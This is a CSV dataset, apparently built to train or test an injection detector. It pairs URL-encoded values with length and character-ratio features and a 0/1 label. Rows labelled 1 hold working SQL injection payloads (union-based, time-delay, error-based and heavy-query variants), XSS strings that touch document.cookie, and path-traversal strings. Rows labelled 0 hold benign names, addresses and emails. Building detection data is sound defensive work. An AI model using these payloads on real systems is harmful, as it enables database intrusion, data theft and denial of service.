payload,payload_len,alpha,non_alpha,attack_feature,label
1%22%20or%204411%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29%20and%20%22utzr%22%20like%20%22utzr,174,90.80459770114942,9.195402298850574,120000.0,1
vilma,5,100.0,0.0,0.0,0
%288362%3D9139%29%2A9139,16,87.5,12.5,14.285714285714285,1
alfalfa%2047%2C,11,100.0,0.0,0.0,0
nicastro,8,100.0,0.0,0.0,0
1%25%27%29%20waitfor%20delay%20%270%3A0%3A5%27%20and%20%28%27%25%27%3D%27,37,64.86486486486487,35.13513513513514,60000.0,1
8arem3to,8,100.0,0.0,0.0,0
mirel-duvitski%40pavimentosalagon.sr,34,100.0,0.0,0.0,0
1.20453E+15,16,68.75,31.25,45.45454545454545,0
8937,4,100.0,0.0,0.0,0
22618043g,9,100.0,0.0,0.0,0
pe7tr0b9,8,100.0,0.0,0.0,0
efran,5,100.0,0.0,0.0,0
teodora,7,100.0,0.0,0.0,0
1%27%29%3Bcall%20regexp_substring%28repeat%28right%28char%283702%29%2C0%29%2C500000000%29%2Cnull%29,69,84.05797101449275,15.94202898550725,18.965517241379317,1
1%29%29%20and%204637%3D1408%20and%20%28%286509%3D6509,33,81.81818181818183,18.181818181818183,60000.0,1
1%29%20as%20biup%20where%201414%3D1414%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,84,88.09523809523809,11.904761904761903,90000.0,1
8ef6ndo,7,100.0,0.0,0.0,0
c/%20los%20granados%20s/n%2013-a,24,100.0,0.0,0.0,0
1%27%2B%28select%20vohg%20where%206383%3D6383%20and%206055%3Dctxsys.drithsx.sn%286055%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%286055%3D6055%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29%29%2B%27,230,73.04347826086956,26.956521739130434,90000.0,1
safaa6,6,100.0,0.0,0.0,0
amaranta,8,100.0,0.0,0.0,0
1%22%29%3Bbegin%20dbms_lock.sleep%285%29%3B%20end%20and%20%28%22qkkn%22%20like%20%22qkkn,56,78.57142857142857,21.428571428571427,60000.0,1
5591,5,80.0,20.0,25.0,0
neugebauer%40buscamoto.gw,23,100.0,0.0,0.0,0
1%25%27%29%20and%206510%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29%20and%20%28%27%25%27%3D%27,166,87.34939759036145,12.650602409638553,90000.0,1
9717,4,100.0,0.0,0.0,0
5217,4,100.0,0.0,0.0,0
jefferson-kuznezov%40productosgarantizados.bb,43,100.0,0.0,0.0,0
calle%20limones%2C%2060%2C,18,100.0,0.0,0.0,0
terland-bartha5%40informatica2009.ck,34,100.0,0.0,0.0,0
1%25%22%29%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull--,50,78.0,22.0,60000.0,1
5005,4,100.0,0.0,0.0,0
4or6un0,7,100.0,0.0,0.0,0
-8758%27%20union%20all%20select%206885%2C6885%2C6885%2C6885%2C6885%2C6885%2C6885%2C6885--,65,83.07692307692308,16.923076923076923,60000.0,1
remante,7,100.0,0.0,0.0,0
31252,5,100.0,0.0,0.0,0
-8163%29%29%20as%20cvai%20where%202360%3D2360%20or%203440%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%283440%3D3440%29%20then%201%20else%200%20end%29%29%3A%3Atext%7,219,53.42465753424658,17.35159817351598,60000.0,1
utrera,6,100.0,0.0,0.0,0
%3Ciframe%20src%3Dhttp%3A//vulnerability-lab.com%3E1337%2B1,47,93.61702127659575,6.38297872340425,6.818181818181812,1
12163,5,100.0,0.0,0.0,0
makeda,6,100.0,0.0,0.0,0
%3Cdiv%20datafld%3D%22b%22%20dataformatas%3D%22html%22%20datasrc%3D%22%23x%22%3E%3C/div%3E%20%5D%5D%3E%20%5Ba%5D%5Ba%5Dscript%3Edocument.cookie%3Dtrue%3B%5Ba%5D%5Ba%5D/script%3E,109,70.64220183486239,20.18348623853211,60000.0,1
nemesio,7,100.0,0.0,0.0,0
1%29%20waitfor%20delay%20%270%3A0%3A5%27%20and%20%282993%3D2993,39,82.05128205128204,17.94871794871795,60000.0,1
1%3Bcall%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,102,81.37254901960785,18.627450980392155,22.891566265060238,1
pl.%20francisca%20pacheco%2C%2081,25,100.0,0.0,0.0,0
carpio%20de%20tajo%2C%20el,18,100.0,0.0,0.0,0
4.94547E+15,16,68.75,31.25,45.45454545454545,0
4642,4,100.0,0.0,0.0,0
1%3Bselect%20%28case%20when%20%287254%3D5901%29%20then%201%20else%207254%2A%28select%207254%20from%20master..sysdatabases%29%20end%29--,95,86.31578947368422,13.684210526315791,30000.0,1
heal%40quadernideilgarda.gob,26,100.0,0.0,0.0,0
16340,5,100.0,0.0,0.0,0
1%22%29%29%20and%203715%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%283715%3D3715%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29%20and%20%28%28%22mzhk%22%3D%22mzhk,204,73.52941176470588,26.47058823529412,60000.0,1
1%22%29%29%29%20and%207756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%287756%3D7756%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29%20and%20%28%28%28%22kcxw%22%3D%22kcxw,228,70.6140350877193,29.385964912280706,90000.0,1
carlos%20arniches%2078%2C,19,100.0,0.0,0.0,0
62tiba74,8,100.0,0.0,0.0,0
1%29%29%20as%20msug%20where%203503%3D3503%20and%20sleep%285%29%23,41,85.36585365853658,14.634146341463413,60000.0,1
1%22%29%3Bselect%20%28case%20when%20%284415%3D2051%29%20then%204415%20else%20cast%281%20as%20int%29/%28select%200%20from%20dual%29%20end%29%20from%20dual--,101,85.14851485148515,14.85148514851485,60000.0,1
haeussler%40corjet.jo,19,100.0,0.0,0.0,0
-8419%29%20where%208692%3D8692%20union%20all%20select%208692%2C8692%2C8692--,56,87.5,12.5,90000.0,1
-2964%22%29%29%20order%20by%201--,21,71.42857142857143,28.57142857142857,30000.0,1
bruna,5,100.0,0.0,0.0,0
-8999%22%20where%202821%3D2821%20union%20all%20select%202821%2C2821%2C2821%2C2821%2C2821%2C2821%2C2821%2C2821%23,80,86.25,13.750000000000002,90000.0,1
1%25%27%29%20and%203202%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%27%25%27%3D%27,76,71.05263157894737,28.947368421052634,69000.0,1
-5802%27%29%29%29%20union%20all%20select%206286%2C6286%2C6286%2C6286%23,47,80.85106382978722,19.148936170212767,60000.0,1
39313,5,100.0,0.0,0.0,0
9285,4,100.0,0.0,0.0,0
struchkova%40gestionsoftware.cl,29,100.0,0.0,0.0,0
calle%20polvorin%2C%20117%2C,20,100.0,0.0,0.0,0
arce/artzi,10,100.0,0.0,0.0,0
ranez%40sandrasummer.bi,21,100.0,0.0,0.0,0
-5224%27%29%20where%201962%3D1962%20union%20all%20select%201962%2C1962%2C1962%2C1962%2C1962%2C1962%2C1962%2C1962%2C1962--,87,83.9080459770115,16.091954022988507,90000.0,1
1.93843E+15,16,68.75,31.25,45.45454545454545,0
sanshe%40raullazaro.bt,20,100.0,0.0,0.0,0
robles%20arteaga,14,100.0,0.0,0.0,0
valls,5,100.0,0.0,0.0,0
gierasch.casini%40goovitae.cu,27,100.0,0.0,0.0,0
8.60573E+15,16,68.75,31.25,45.45454545454545,0
1%25%27%29%29%3Bselect%20case%20when%203920%3D4402%20then%201%20else%20null%20end--,55,90.9090909090909,9.090909090909093,10.000000000000004,1
1%25%22%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,59,79.66101694915254,20.33898305084746,60000.0,1
-4371%27%29%29%29%20union%20all%20select%207465%2C7465%2C7465%2C7465%2C7465%2C7465%2C7465%23,62,80.64516129032258,19.35483870967742,60000.0,1
45210940r,9,100.0,0.0,0.0,0
e_ncobador,10,100.0,0.0,0.0,0
-2790%27%29%20as%20xhct%20where%205756%3D5756%20union%20all%20select%205756%2C5756%23,59,89.83050847457628,10.16949152542373,90000.0,1
empa.etar,9,100.0,0.0,0.0,0
tefilo,6,100.0,0.0,0.0,0
1%20and%20sleep%285%29,14,85.71428571428571,14.285714285714285,30000.0,1
-4669%27%20union%20all%20select%209387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387%2C9387--,75,82.66666666666667,17.333333333333336,60000.0,1
-5356%27%29%20or%209323%3D9323%23,21,76.19047619047619,23.809523809523807,30000.0,1
1%29%3Bselect%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20and%20%283770%3D3770,100,88.0,12.0,60000.0,1
glaser,6,100.0,0.0,0.0,0
1%27%29%20union%20all%20select%20null%2Cnull%2Cnull--,37,83.78378378378379,16.216216216216218,60000.0,1
barker%20ropero,13,100.0,0.0,0.0,0
15429251t,9,100.0,0.0,0.0,0
42010181z,9,100.0,0.0,0.0,0
1%27%29%20where%203730%3D3730%20and%20sleep%285%29%23,33,81.81818181818183,18.181818181818183,60000.0,1
1%27%29%29%29%20or%20char%2868%29%7C%7Cchar%2869%29%7C%7Cchar%2897%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%285389%29%2C0%29%2C5000000000%29%2Cnull%29%20and%20%28%28%28%27ujjr%27%3D%27ujjr,129,70.54263565891473,29.457364341085274,60000.0,1
1%27%20in%20boolean%20mode%29%20union%20all%20select%20null%2Cnull%2Cnull%23,52,90.38461538461539,9.615384615384617,60000.0,1
-8707%27%29%20union%20all%20select%205609%2C5609%2C5609--,41,82.92682926829268,17.073170731707318,60000.0,1
tristan,7,100.0,0.0,0.0,0
caballillo,10,100.0,0.0,0.0,0
hoyo%20de%20pinares%2C%20el,19,100.0,0.0,0.0,0
1%27%29%20and%203707%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29%20and%20%28%27ejnt%27%20like%20%27ejnt,127,86.61417322834646,13.385826771653544,120000.0,1
37110,5,100.0,0.0,0.0,0
jamn%20ibrico,11,100.0,0.0,0.0,0
8.24508E+14,16,68.75,31.25,45.45454545454545,0
steele-kripilani%40vendomiatico.se,32,100.0,0.0,0.0,0
8300,5,80.0,20.0,25.0,0
luis%20diaz%20cobea%2C%2098%2C,20,100.0,0.0,0.0,0
aula,4,100.0,0.0,0.0,0
3335,4,100.0,0.0,0.0,0
-6407%27%29%20or%20elt%281631%3D4946%2C4946%29%20and%20%28%27jpnz%27%3D%27jpnz,48,75.0,25.0,60000.0,1
burguez%20bonany,14,100.0,0.0,0.0,0
13026737c,9,100.0,0.0,0.0,0
blasco%20de%20garay%2C%20168%2C,21,100.0,0.0,0.0,0
1%27%2B%28select%20%27midn%27%20where%202819%3D2819%20or%209643%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29%29%2B%27,129,84.49612403100775,15.503875968992247,90000.0,1
duan,4,100.0,0.0,0.0,0
1%22%29%20where%208953%3D8953%20or%205356%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29--,171,90.05847953216374,9.941520467836257,90000.0,1
47318,5,100.0,0.0,0.0,0
parque%20barranco%20de%20coquin%2067%2C%208%3Fd,33,100.0,0.0,0.0,0
1%22%29%29%29%20and%206510%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29%20and%20%28%28%28%22agaz%22%3D%22agaz,176,86.93181818181817,13.068181818181818,90000.0,1
1%29%20as%20qzif%20where%207877%3D7877%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,80,87.5,12.5,90000.0,1
15008,5,100.0,0.0,0.0,0
%3Chtml%3E%3Cnoalert%3E%3Cnoscript%3E%28xss%29%3C/noscript%3E%3Cscript%3E%28xss%29%3C/script%3E,63,74.60317460317461,25.396825396825392,34.042553191489354,1
1%27%29%20where%207587%3D7587%20or%208421%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,79,81.0126582278481,18.9873417721519,90000.0,1
34196882e,9,100.0,0.0,0.0,0
amancio,7,100.0,0.0,0.0,0
doa,3,100.0,0.0,0.0,0
-7239%27%20or%205903%3D%28%27qqpjq%27%7C%7C%28select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%20and%20%27cswv%27%3D%27cswv,116,82.75862068965517,17.24137931034483,90000.0,1
%3E%22%3Cimg%20src%3D%22livescript%3Adocument.cookie%3Dtrue%3B%22%3E,46,76.08695652173914,23.91304347826087,60000.0,1
paseo%20alberto%20palacios%2C%2061%2C,27,100.0,0.0,0.0,0
18l4et2ro,9,100.0,0.0,0.0,0
camio%20adelfas%2C%20148%2C%205%3Fg,23,100.0,0.0,0.0,0
hiller,6,100.0,0.0,0.0,0
r0326451anis81,14,100.0,0.0,0.0,0
1%29%29%20or%208315%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29%20and%20%28%289914%3D9914,119,86.5546218487395,13.445378151260504,90000.0,1
10592,5,100.0,0.0,0.0,0
1%27%29%20or%20char%28117%29%7C%7Cchar%28111%29%7C%7Cchar%28105%29%7C%7Cchar%28100%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29,143,71.32867132867133,28.671328671328673,30000.0,1
1%29%3Bselect%20%28case%20when%20%289455%3D6007%29%20then%209455%20else%209455%2A%28select%209455%20from%20mysql.db%29%20end%29%23,86,86.04651162790698,13.953488372093023,30000.0,1
-2039%27%29%20or%202724%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%282724%3D2724%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bc,187,63.63636363636363,20.32085561497326,30000.0,1
av.%20de%20la%20reina%20sofia%20151,25,100.0,0.0,0.0,0
85855294c,9,100.0,0.0,0.0,0
47eg0,5,100.0,0.0,0.0,0
-6760%20or%201570%3Dconvert%28int%2C%28select%20char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%281570%3D1570%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%2,206,62.62135922330098,17.475728155339805,30000.0,1
salavedra%20castelltort,21,100.0,0.0,0.0,0
marcos%20redondo%20151%2C%2010%3Fb,24,100.0,0.0,0.0,0
-4325%27%20or%20make_set%289354%3D9354%2C7185%29,34,79.41176470588235,20.588235294117645,30000.0,1
es93n576te,10,100.0,0.0,0.0,0
logroo%2C%2098%2C%205-d,15,100.0,0.0,0.0,0
-6186%27%20in%20boolean%20mode%29%20union%20all%20select%202990%2C2990%2C2990%23,56,89.28571428571429,10.714285714285714,60000.0,1
/%7Bfile%7D,7,71.42857142857143,28.57142857142857,40.0,1
-3505%22%29%20where%202340%3D2340%20or%209323%3D9323%23,37,83.78378378378379,16.216216216216218,60000.0,1
46208410f,9,100.0,0.0,0.0,0
c/%20cubillo%20aragon%2045,20,100.0,0.0,0.0,0
1%29%20where%206494%3D6494%3Bif%286745%3D4078%29%20select%206745%20else%20drop%20function%20ytyt--,70,88.57142857142857,11.428571428571429,90000.0,1
1%29%20as%20svkf%20where%206503%3D6503%20or%20char%2875%29%7C%7Cchar%2870%29%7C%7Cchar%2899%29%7C%7Cchar%2883%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,164,73.78048780487805,26.21951219512195,60000.0,1
1%22%20where%201852%3D1852%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,81,86.41975308641975,13.580246913580247,90000.0,1
nahuel,6,100.0,0.0,0.0,0
3.19537E+15,16,68.75,31.25,45.45454545454545,0
c/%20arc%20de%20sant%20ramon%20del%20call%2C%20189%2C%202-e,39,100.0,0.0,0.0,0
-8057%27%29%29%20as%20gpue%20where%204205%3D4205%20or%203440%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%283440%3D3440%29%20then%201%20else%200%20end%29%29%3A%3Atex,220,52.27272727272727,17.272727272727273,60000.0,1
alert%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E,69,63.76811594202898,36.23188405797102,56.818181818181834,1
fuentelviejo,12,100.0,0.0,0.0,0
-1436%27%20or%205699%3D5783--,21,76.19047619047619,23.809523809523807,30000.0,1
e0iz877,7,100.0,0.0,0.0,0
1%22%29%20where%202388%3D2388%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,83,84.33734939759037,15.66265060240964,90000.0,1
paleogrfico,11,100.0,0.0,0.0,0
isabelita%20ruiz%2C%2031,18,100.0,0.0,0.0,0
1%25%27%29%29%20rlike%20sleep%285%29%23,21,66.66666666666666,33.33333333333334,50.00000000000002,1
ob1et7nt9,9,100.0,0.0,0.0,0
1%25%22%20and%208189%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29--,106,85.84905660377359,14.150943396226415,60000.0,1
1%27%29%29%3Bselect%20%28case%20when%20%285142%3D6855%29%20then%205142%20else%205142%2A%28select%205142%20from%20mysql.db%29%20end%29%23,88,84.0909090909091,15.909090909090908,30000.0,1
93254282t,9,100.0,0.0,0.0,0
1%22%29%29%3Bbegin%20user_lock.sleep%285%29%3B%20end%20and%20%28%28%22kvts%22%20like%20%22kvts,58,75.86206896551724,24.137931034482758,60000.0,1
1%27%7C%7C%28select%20%27tisi%27%20from%20dual%20where%201616%3D1616%20and%202853%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%282853%3D2853%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20as%20numeric%29%29%7C%7C%27,235,71.48936170212767,28.510638297872344,90000.0,1
-7350%27%29%29%29%20union%20all%20select%209207%2C9207%2C9207%2C9207--,48,79.16666666666666,20.833333333333336,60000.0,1
1%27%20or%204240%3D%28select%204240%20from%20pg_sleep%285%29%29--,43,79.06976744186046,20.930232558139537,60000.0,1
c/%20manresa%2056%202-e,17,100.0,0.0,0.0,0
1%2C%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%289693%3D9693%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29,153,81.69934640522875,18.30065359477124,30000.0,1
1%29%20where%208433%3D8433%20rlike%20%28select%20%28case%20when%20%287689%3D7689%29%20then%201%20else%200x28%20end%29%29--,80,86.25,13.750000000000002,30000.0,1
/../..//../..//../..///%7Bfile%7D,29,93.10344827586206,6.896551724137936,7.407407407407413,1
arcos,5,100.0,0.0,0.0,0
clemant%40engibraltar.com.ae,26,100.0,0.0,0.0,0
calle%20maria%20marin%2C%20196%2C,23,100.0,0.0,0.0,0
-3017%22%29%29%20as%20ljit%20where%209128%3D9128%20union%20all%20select%209128%2C9128%2C9128%2C9128%2C9128--,76,85.52631578947368,14.473684210526317,90000.0,1
van_bake,8,100.0,0.0,0.0,0
1%25%22%29%20rlike%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29sgvo%29%20and%20%28%22%25%22%3D%22,60,70.0,30.0,60000.0,1
c/%20san%20francisco%2C%2045,20,100.0,0.0,0.0,0
3.83603E+15,16,68.75,31.25,45.45454545454545,0
7953,5,80.0,20.0,25.0,0
madriles%20hernandez,18,100.0,0.0,0.0,0
26527823z,9,100.0,0.0,0.0,0
83497200r,9,100.0,0.0,0.0,0
%22%60false%60%22,9,55.55555555555556,44.44444444444444,80.0,1
dailey%40flabingo.gw,18,100.0,0.0,0.0,0
avinguda%20de%20la%20reina%20maria%20cristina%20174%202%3Fb,43,100.0,0.0,0.0,0
7.55794E+14,16,68.75,31.25,45.45454545454545,0
1%20where%207452%3D7452%20or%204240%3D%28select%204240%20from%20pg_sleep%285%29%29--,58,84.48275862068965,15.517241379310345,90000.0,1
ohala,5,100.0,0.0,0.0,0
96,2,100.0,0.0,0.0,0
smelters,8,100.0,0.0,0.0,0
1%27%7C%7C%28select%20%27zxla%27%20from%20dual%20where%207634%3D7634%20and%206240%3D%28%27qqpjq%27%7C%7C%28select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%29%7C%7C%27,142,82.3943661971831,17.6056338028169,120000.0,1
arceo%20feliu,11,100.0,0.0,0.0,0
86913775h,9,100.0,0.0,0.0,0
/../..//%7Bfile%7D,14,85.71428571428571,14.285714285714292,16.666666666666675,1
calle%20vallseca%20123,18,100.0,0.0,0.0,0
27047841w,9,100.0,0.0,0.0,0
1%27%29%20as%20mzby%20where%206530%3D6530%3Bselect%20%28case%20when%20%284660%3D4660%29%20then%204660%20else%20cast%281%20as%20int%29/%28select%200%20from%20dual%29%20end%29%20from%20dual--,125,87.2,12.8,90000.0,1
1%27%20or%204411%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29%20and%20%27vgro%27%20like%20%27vgro,174,90.80459770114942,9.195402298850574,120000.0,1
1%27%29%20where%204509%3D4509%20union%20all%20select%20null--,43,88.37209302325581,11.627906976744185,90000.0,1
-8143%29%20union%20all%20select%203014--,30,86.66666666666667,13.333333333333334,60000.0,1
5.42538E+15,16,68.75,31.25,45.45454545454545,0
1%27%29%29%20as%20yyja%20where%204321%3D4321%20or%208315%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29--,130,86.92307692307692,13.076923076923078,90000.0,1
6991,4,100.0,0.0,0.0,0
kiyohara,8,100.0,0.0,0.0,0
1%25%22%20and%20sleep%285%29%23,17,70.58823529411765,29.411764705882355,30000.0,1
/../..//../..//../..//../%7Bfile%7D,31,93.54838709677419,6.451612903225808,6.896551724137932,1
1%27%29%29%20and%203707%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29%20and%20%28%28%27sied%27%3D%27sied,124,83.87096774193549,16.129032258064516,90000.0,1
1%27%29%29%3Bselect%20%28case%20when%20%286615%3D3564%29%20then%201%20else%206615%2A%28select%206615%20from%20master..sysdatabases%29%20end%29--,98,83.6734693877551,16.3265306122449,30000.0,1
1%27%20or%202633%3Ddbms_pipe.receive_message%28chr%28112%29%7C%7Cchr%2865%29%7C%7Cchr%2865%29%7C%7Cchr%28103%29%2C5%29%20and%20%27ozur%27%3D%27ozur,93,72.04301075268818,27.956989247311824,60000.0,1
offers,6,100.0,0.0,0.0,0
badosa%20estruch,14,100.0,0.0,0.0,0
3a2rimo19,9,100.0,0.0,0.0,0
1%27%20and%204595%3D4595%23,17,82.35294117647058,17.647058823529413,30000.0,1
i91ro21rc197a1o,15,100.0,0.0,0.0,0
04or2ativ1,10,100.0,0.0,0.0,0
c/%20canigo%2C%20196%208%3Fg,18,100.0,0.0,0.0,0
calle%20la%20revoltosa%2C%2055%2C%2011c,27,100.0,0.0,0.0,0
diezma,6,100.0,0.0,0.0,0
shar,4,100.0,0.0,0.0,0
c/%20florida%20162%201-f,18,100.0,0.0,0.0,0
azema.alvir%40telogis.gf,22,100.0,0.0,0.0,0
-2441%27%20union%20all%20select%201853%2C1853%2C1853%2C1853%2C1853%2C1853%2C1853--,60,83.33333333333334,16.666666666666664,60000.0,1
1%27%7C%7C%28select%20%27bccx%27%20where%205881%3D5881%20and%20elt%281210%3D1210%2Csleep%285%29%29%29%7C%7C%27,66,74.24242424242425,25.757575757575758,60000.0,1
cobran,6,100.0,0.0,0.0,0
1%27%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29,61,77.04918032786885,22.950819672131146,9000.0,1
1%29%20or%20row%281045%2C7562%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%281045%3D1045%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%208488%20union%20select%205584%20union%20select%203051%20union%20select%201210%29a%20group%20by%20x%29%20and%20%283872%3D3872,218,84.86238532110092,15.137614678899084,270000.0,1
-3458%27%29%20where%202053%3D2053%20or%204747%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284747%3D4747%29%20then%201%20else%200%20end%29%20fr,227,56.38766519823789,16.299559471365637,60000.0,1
